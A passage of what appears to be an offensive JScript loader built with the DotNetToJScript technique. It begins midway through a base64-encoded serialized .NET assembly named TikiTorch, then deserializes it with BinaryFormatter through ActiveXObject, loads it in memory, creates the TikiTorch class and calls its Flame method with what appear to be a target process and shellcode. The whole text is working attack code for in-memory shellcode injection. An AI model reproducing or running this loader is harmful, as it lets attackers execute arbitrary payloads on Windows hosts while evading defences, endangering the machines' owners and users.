"GBgFIAEYHQUEIAEYGAUgAQEREAYgAgEOHQUIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRp"+
"b25UaHJvd3MBCAEABwEAAAAADgEACVRpa2lUb3JjaAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAg"+
"MjAxOQAAKQEAJDJmZmFmYWEzLWMyYjYtNDMxYi1iN2I0LTBlODY0ZjYyYzdjYgAADAEABzEuMC4w"+
"LjAAAEkBABouTkVURnJhbWV3b3JrLFZlcnNpb249djQuNQEAVA4URnJhbWV3b3JrRGlzcGxheU5h"+
"bWUSLk5FVCBGcmFtZXdvcmsgNC41BQEAAQAABAEAAAAAAAAAAMW9x/gAAAAAAgAAAFEAAADERAAA"+
"xCYAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RThW9TwTqLikmtPOk6+rz0yQEAAABE"+
"OlxUb29sc1xUaWtpVG9yY2hcVGlraVRvcmNoXG9ialx4ODZcRGVidWdcVGlraVRvcmNoLnBkYgA9"+
"RQAAAAAAAAAAAABXRQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASUUAAAAAAAAAAAAAAABfQ29y"+
"RGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAA"+
"AAAAAAAAAAAAAAABAAAAAABIAAAAWGAAABwDAAAAAAAAAAAAABwDNAAAAFYAUwBfAFYARQBSAFMA"+
"SQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAAC"+
"AAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIA"+
"YQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAR8AgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBm"+
"AG8AAABYAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAA"+
"IgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAPAAKAAEARgBpAGwAZQBEAGUAcwBj"+
"AHIAaQBwAHQAaQBvAG4AAAAAAFQAaQBrAGkAVABvAHIAYwBoAAAAMAAIAAEARgBpAGwAZQBWAGUA"+
"cgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAPAAOAAEASQBuAHQAZQByAG4AYQBsAE4AYQBt"+
"AGUAAABUAGkAawBpAFQAbwByAGMAaAAuAGQAbABsAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkA"+
"cgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMQA5AAAAKgABAAEATABl"+
"AGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABEAA4AAQBPAHIAaQBnAGkAbgBhAGwA"+
"RgBpAGwAZQBuAGEAbQBlAAAAVABpAGsAaQBUAG8AcgBjAGgALgBkAGwAbAAAADQACgABAFAAcgBv"+
"AGQAdQBjAHQATgBhAG0AZQAAAAAAVABpAGsAaQBUAG8AcgBjAGgAAAA0AAgAAQBQAHIAbwBkAHUA"+
"YwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5"+
"ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAABAAAAMAAAAbDUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1i"+
"bHkgTG9hZChCeXRlW10pCAAAAAoL";
var entry_class = 'TikiTorch';

try {
	setversion();
	var stm = base64ToStream(obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var n = fmt.SurrogateSelector;
	var d = fmt.Deserialize_2(stm);
	al.Add(n);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	o.Flame(tp, sc);
	
} catch (e) {
    debug(e.message);
}